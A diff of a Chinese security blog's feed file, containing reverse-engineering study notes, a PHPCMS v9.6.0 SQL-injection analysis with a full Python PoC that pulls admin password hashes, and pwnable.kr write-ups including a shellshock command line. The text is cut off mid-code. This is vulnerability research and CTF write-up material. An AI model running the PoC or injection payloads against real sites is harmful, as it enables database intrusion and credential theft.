+<li>GetDlgItem（）： 获取指定对话框的句柄。</li>
+<li>GetDlgItemText（）: 获取对话框文本。<ul>
+<li>GetDlgItemTextA</li>
+<li>GetDlgItemTextW</li>
+</ul>
+</li>
+<li>GetDlgItemInt（） ： 获取对话框整数值。</li>
+<li>MessageBox（）：USER32.DLL中，创建和显示信息框。<ul>
+<li>MessageBoxA</li>
+<li>MessageBoxW</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>句柄：Windows标识，由应用程序简历或使用的对象所使用的一个唯一的整数值。</li>
+<li>Windows消息机制<ul>
+<li>消息(Message)驱动式系统。</li>
+<li>消息队列：系统消息队列，应用程序消息队列。</li>
+<li>常用的Windows消息函数：<ul>
+<li>SendMessage（）函数</li>
+<li>WM_COMMAND消息</li>
+<li>WM_DESTORY</li>
+<li>WM_GETTEXT</li>
+<li>WM_QUIT</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="保护模式简介"><a href="#保护模式简介" class="headerlink" title="保护模式简介"></a>保护模式简介</h2><ol>
+<li>三种模式： 实模式，保护模式，虚拟86模式。当前系统主要运行在保护模式下。</li>
+<li>虚拟内存</li>
+<li>保护模式的权限级别</li>
+</ol>
+<h2 id="认识PE格式"><a href="#认识PE格式" class="headerlink" title="认识PE格式"></a>认识PE格式</h2><ol>
+<li>文件分成不同的区块：<ul>
+<li>.text : 代码段</li>
+<li>.rdata : 运行期只读数据</li>
+<li>.data : 初始化的数据块</li>
+<li>.idata : 包含其他外来DLL的函数及数据信息，即输入表。</li>
+<li>.rsrc : 包含模块的全部资源</li>
+</ul>
+</li>
+<li>PE相关名词解释：<ul>
+<li>入口点(Entry Point) ： 程序执行时的第一行代码</li>
+<li>文件偏移地址(File Offset) : PE文件在磁盘上时各数据的地址。文件偏移地址从PE文件的第一个字节开始计数，起始值为0</li>
+<li>虚拟地址（Virtual Address， VA）: 程序访问存储器所使用的逻辑地址。又称内存偏移地址(Memory Offset)。可写成“段选择子：偏移量”的形式。</li>
+<li>基地址（ImageBase）：文件执行时被映射到指定内存地址中，这个初始内存地址即为基地址。由PE文件本身设定。</li>
+</ul>
+</li>
+</ol>
+<h1 id="第二章-动态分析技术"><a href="#第二章-动态分析技术" class="headerlink" title="第二章 动态分析技术"></a>第二章 动态分析技术</h1><h2 id="OllDbg"><a href="#OllDbg" class="headerlink" title="OllDbg"></a>OllDbg</h2><ul>
+<li>界面<ul>
+<li>反汇编面板窗口</li>
+<li>信息面板窗口</li>
+<li>数据面板窗口</li>
+<li>寄存器面板窗口</li>
+<li>堆栈面板窗口</li>
+</ul>
+</li>
+<li>配置<ul>
+<li>界面设置</li>
+<li>调试设置</li>
+<li>加载符号文件</li>
+<li>加载右键菜单</li>
+</ul>
+</li>
+<li>加载程序<ul>
+<li>创建进程</li>
+<li>attach进程</li>
+</ul>
+</li>
+<li>基本操作<ul>
+<li>F7 ： 单步步进，遇到CALL 跟进</li>
+<li>F8 ： 单步步入，遇到CALL 路过，不跟进</li>
+<li>Ctrl+ F9 : 直到ret指令时中断</li>
+<li>Alt + F9 : 从系统领空回到应用程序领空</li>
+<li>F9 ： 运行程序</li>
+<li>F2 ： 设置断点</li>
+<li>保存修改后的文件：<ul>
+<li>右键 Copy to executable/Selection</li>
+</ul>
+</li>
+<li>Alt+M ： 显示内存</li>
+</ul>
+</li>
+</ul>
+<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="INT3断点"><a href="#INT3断点" class="headerlink" title="INT3断点"></a>INT3断点</h3><p>int3断点，机器码为CCh。当被调试进程执行INT3指令导致一个异常时，调试器捕捉异常并停下来。好处是可以下无数个，但缺点是改变了源程序指令，容易被检测到。检测方法为：取得检测函数的地址，读取第一个字节是否为cc。</p>
+<h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>与DRx调试器相关。DRx调试器一共有八个。</p>
+<ul>
+<li>DR0 ~ DR3 : 调试地址寄存器，保存需要监视的地址。</li>
+<li>DR4 ~ DR5 : 未知</li>
+<li>DR6 : 调试寄存器组状态寄存器</li>
+<li>DR7 : 调试寄存器组控制寄存器</li>
+</ul>
+<p>DR0 ~ DR3来设定地址，DR7设置状态，最多只能设置4个断电。优点速度快，可用于替代CC断点。</p>
+<h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>对所设的地址设置为不可访问/不可写属性。当访问/写入时产生异常，ollydbg捕获异常后比较是不是断点地址，若是则中断。缺点：慢。不修改源代码，在遇到代码校验时，并且硬件断点失灵的时候，可以用内存断点来代替。数量为1个。</p>
+<h3 id="内存访问一次性断点"><a href="#内存访问一次性断点" class="headerlink" title="内存访问一次性断点"></a>内存访问一次性断点</h3><p>按Alt+M显示内存后，有许多段。在相应的段上单击右键，选择Set break on access，会对整个内存块设置该类断点。这是一次性断点，当所在段被读取或被执行后中断，中断完成后断点将被删除。</p>
+<h3 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h3><h3 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h3><h3 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h3><h1 id="第三章-静态分析技术"><a href="#第三章-静态分析技术" class="headerlink" title="第三章 静态分析技术"></a>第三章 静态分析技术</h1><h2 id="文件类型分析"><a href="#文件类型分析" class="headerlink" title="文件类型分析"></a>文件类型分析</h2><ul>
+<li>PEID工具<ul>
+<li>用处：检测大多数编译语言、病毒和加密的壳</li>
+<li>原理：被加壳的程序处理过的程序在壳里会留下相关加壳软件的信息。</li>
+<li>参考</li>
+</ul>
+</li>
+<li>Fileinfo</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;跟着《加密与解密》学习。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Bin Security" scheme="http://yoursite.com/categories/Bin-Security/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="re" scheme="http://yoursite.com/tags/re/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[WAF-Bypass] Mysql 注入绕过姿势</title>
+    <link href="http://yoursite.com/2017/08/14/WAF-Bypass-Mysql-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
+    <id>http://yoursite.com/2017/08/14/WAF-Bypass-Mysql-注入绕过姿势/</id>
+    <published>2017-08-14T12:09:04.000Z</published>
+    <updated>2017-08-14T12:10:03.066Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="WAF-Bypass" scheme="http://yoursite.com/tags/WAF-Bypass/"/>
     
   </entry>
   
@@ -948,383 +1469,6 @@
       <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHPCMS v9.6.0 wap模块sql注入漏洞分析</title>
-    <link href="http://yoursite.com/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://yoursite.com/2017/08/04/PHPCMS-v9-6-0-wap模块sql注入漏洞分析/</id>
-    <published>2017-08-04T06:19:51.000Z</published>
-    <updated>2017-08-04T07:50:24.490Z</updated>
-    
-    <content type="html"><![CDATA[<p>PHPCMS v9.6.0 wap模块sql注入漏洞分析<br><a id="more"></a></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在/phpcms/modules/content/down.php中，约莫第11行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">unset</span>($i,$m,$f);</div><div class="line">	parse_str($a_k);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</div><div class="line">	$allow_visitor = <span class="number">1</span>;</div><div class="line">	$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</div><div class="line">	$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</div><div class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</div><div class="line">	$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</div></pre></td></tr></table></figure></p>
-<p>首先，通过GET方法得到参数<code>$a_k</code>。在经过<code>sys_auth</code>解密(里面有个DECODE)后，对<code>$a_k</code>进行了一次parse_str($a_k)，parse_str()会把字符串解析到对ing的变量中。在经过解析后，通过语句<code>$rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>将变量id带入查询。所以目标是寻找一个能加密的地方，并且能够回显给我们，这样就能构造参数$a_k，并造成注入。</p>
-<p>在 /phpcms/modules/attachment/attachments.php 中，约莫第239行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</div><div class="line">		$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</div><div class="line">		$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</div><div class="line">		$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</div><div class="line">		$json_str = json_encode($arr);</div><div class="line">		$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</div><div class="line">		$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</div><div class="line">		<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</div><div class="line">			param::set_cookie(<span class="string">'att_json'</span>,$json_str);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;			</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<p>通过GET方法得到参数$arr[‘src’]，先经过<code>safe_replace()</code>过滤。我们先看一下<code>safe_replace()</code>函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</div><div class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>将<code>%27</code>等关键字过滤。但是利用“*”会被直接过滤为空这点，假设传入的$string为<code>%2*7</code>,则在替换后，会变成<code>%27</code>，从而获得单引号，其余可类似绕过。</p>
-<p>接下来继续运行。若不满足条件，会进入set_cookie()函数，具体如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</div><div class="line">	$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</div><div class="line">	$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</div><div class="line">	$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</div><div class="line">	$_COOKIE[$var] = $value;</div><div class="line">	<span class="keyword">if</span> (is_array($value)) &#123;</div><div class="line">		<span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</div><div class="line">			setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>其中，会将传入的参数进行一次加密sys_auth($value, ‘ENCODE’)，这正好满足我们前面的需求。</p>
-<p>为了能访问到swfupload_json()，我们需要一个cookie。这样在访问时才不会直接跳转到登陆也main。接下来就是寻找能够给我们提供这次setcookie机会的接口。比如说wap模块。<br>在 /phpcms/modules/wap/index.php 中，约莫第6行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		</div><div class="line">	<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</div><div class="line">	<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</div><div class="line">	param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);</div></pre></td></tr></table></figure></p>
-<p>通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。</p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><ul>
-<li>访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。</li>
-<li>将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】</li>
-<li>获取返回头的set—Cookie字段，此即为加密后的payload</li>
-<li>访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。</li>
-</ul>
-<h2 id="cmsPoc"><a href="#cmsPoc" class="headerlink" title="cmsPoc"></a><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a></h2><p>开源CMS渗透测试框架 <a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a>中已集成了利用脚本 v960_sqlinject_getpasswd.py。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> target</div><div class="line"><span class="keyword">import</span> requests,sys,urllib</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		url = target.url</div><div class="line">		sqli_prefix = <span class="string">'%*27an*d%20'</span></div><div class="line">		sqli_info = <span class="string">'updatexml(1,concat(1,(user())),1)'</span></div><div class="line">		sqli_password1 = <span class="string">'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '</span></div><div class="line">		sqli_password2 = <span class="string">'_admin limit 0,1)),1)'</span></div><div class="line">		sqli_padding = <span class="string">'%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'</span></div><div class="line"></div><div class="line">		step1 = url + <span class="string">'/index.php?m=wap&amp;a=index&amp;siteid=1'</span></div><div class="line">		r = requests.get(step1)</div><div class="line">		post = &#123;<span class="string">"userid_flash"</span>:r.cookies[<span class="string">"GPYAh_siteid"</span>]&#125;</div><div class="line">		print(<span class="string">'[+] Get Cookie : '</span> + r.cookies[<span class="string">"GPYAh_siteid"</span>])</div><div class="line"></div><div class="line">		step2  = url + <span class="string">"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id="</span> + sqli_prefix + sqli_info+ sqli_padding</div><div class="line">		r = requests.post(step2,data=post)</div><div class="line">		sqli_payload = r.cookies[<span class="string">"GPYAh_att_json"</span>]</div><div class="line">		print(<span class="string">'[+] Get SQLi Payload : '</span> + sqli_payload)</div><div class="line"></div><div class="line">		step3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</div><div class="line">		html = requests.get(step3).text</div><div class="line"></div><div class="line">		db_start = html.find(<span class="string">"SELECT * FROM `"</span>) + len(<span class="string">"SELECT * FROM `"</span>)</div><div class="line">		db_end = html.find(<span class="string">"`.`"</span>)</div><div class="line">		Database = html[db_start:db_end]</div><div class="line">		print(<span class="string">"[+] Get Database Name: "</span>+ Database)</div><div class="line"></div><div class="line">		tableprefix_start = html.find(<span class="string">"`.`"</span>) + len(<span class="string">"`.`"</span>)</div><div class="line">		tableprefix_end = html.find(<span class="string">"_download_data"</span>)</div><div class="line">		tableprefix = html[tableprefix_start:tableprefix_end]</div><div class="line">		print(<span class="string">"[+] Get Table Prefix: "</span>+ tableprefix)</div><div class="line"></div><div class="line">		startIndex = html.find(<span class="string">"XPATH syntax error: '"</span>) + len(<span class="string">"XPATH syntax error: '"</span>)</div><div class="line">		endIndex = html.find(<span class="string">"' &lt;br /&gt; &lt;b&gt;MySQL Errno"</span>)</div><div class="line">		database_user = html[startIndex:endIndex]</div><div class="line">		print(<span class="string">"[+] Get Database-user Information : "</span> + database_user)</div><div class="line"></div><div class="line">		step4  = url + <span class="string">"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id="</span> + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding</div><div class="line">		r = requests.post(step4,data=post)</div><div class="line">		sqli_payload = r.cookies[<span class="string">"GPYAh_att_json"</span>]</div><div class="line"></div><div class="line">		setp5 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</div><div class="line">		html = requests.get(setp5).text</div><div class="line">		startIndex = html.find(<span class="string">"XPATH syntax error: '"</span>) + len(<span class="string">"XPATH syntax error: '"</span>)</div><div class="line">		endIndex = html.find(<span class="string">"' &lt;br /&gt; &lt;b&gt;MySQL Errno"</span>)</div><div class="line">		admin_passwd = html[startIndex:endIndex]</div><div class="line">		print(<span class="string">"[+] Get User Passwd: "</span> + admin_passwd)</div><div class="line"></div><div class="line">		print(<span class="string">"\033[33m[*] Complete this task: &#123;&#125; \033[0m"</span>.format(target.url))</div><div class="line"></div><div class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</div><div class="line"></div><div class="line">		print(<span class="string">"\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"</span>)</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/cmsPoc/blob/master/tty.gif?raw=true" alt=""></p>
-<p>本文收录于：<a href="https://chybeta.gitbooks.io/vuln-time/content/weban-quan/sqlzhu-ru/phpcms-v960-wapmo-kuai-zhu-ru.html" target="_blank" rel="external">【gitbook:Vuln-Time】</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;PHPCMS v9.6.0 wap模块sql注入漏洞分析&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnable.kr:shellshock</title>
-    <link href="http://yoursite.com/2017/08/01/Pwnable-kr-shellshock/"/>
-    <id>http://yoursite.com/2017/08/01/Pwnable-kr-shellshock/</id>
-    <published>2017-08-01T13:00:26.000Z</published>
-    <updated>2017-08-01T13:22:02.121Z</updated>
-    
-    <content type="html"><![CDATA[<p>bash破壳漏洞应用。<br><a id="more"></a></p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">	setresuid(getegid(), getegid(), getegid());</div><div class="line">	setresgid(getegid(), getegid(), getegid());</div><div class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>有名的bash破壳漏洞。所以这里不展开了。直接给出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; /bin/cat flag&apos; ./shellshock</div><div class="line">only if I knew CVE-2014-6271 ten years ago..!!</div><div class="line">Segmentation fault</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;bash破壳漏洞应用。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnable.kr:mistake</title>
-    <link href="http://yoursite.com/2017/08/01/Pwnable-kr-mistake/"/>
-    <id>http://yoursite.com/2017/08/01/Pwnable-kr-mistake/</id>
-    <published>2017-08-01T12:43:35.000Z</published>
-    <updated>2017-08-01T12:54:12.074Z</updated>
-    
-    <content type="html"><![CDATA[<p>操作符优先级问题。c语言中<code>=</code>优先级为14，而<code>&lt;</code>优先级为6。<br><a id="more"></a></p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</div><div class="line">		s[i] ^= XORKEY;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span 